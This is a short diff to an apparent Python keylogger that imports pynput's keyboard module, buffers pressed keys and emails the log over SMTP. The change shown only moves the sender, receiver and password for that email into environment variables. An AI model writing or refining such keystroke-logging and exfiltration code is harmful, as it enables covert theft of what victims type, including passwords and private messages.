@@ -1,5 +1,6 @@
 import datetime
 import smtplib
+import os
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from pynput import keyboard
@@ -10,9 +11,9 @@ keys_pressed = ""
 
 def email_log_file(log_file):
     # Information needed to send it
-    sender = ""
-    receiver = ""
-    password = ""
+    sender = os.environ["SENDER"]
+    receiver = os.environ["RECEIVER"]
+    password = os.environ["PASSWORD"]
 
     # Builds the message
     message = MIMEMultipart()
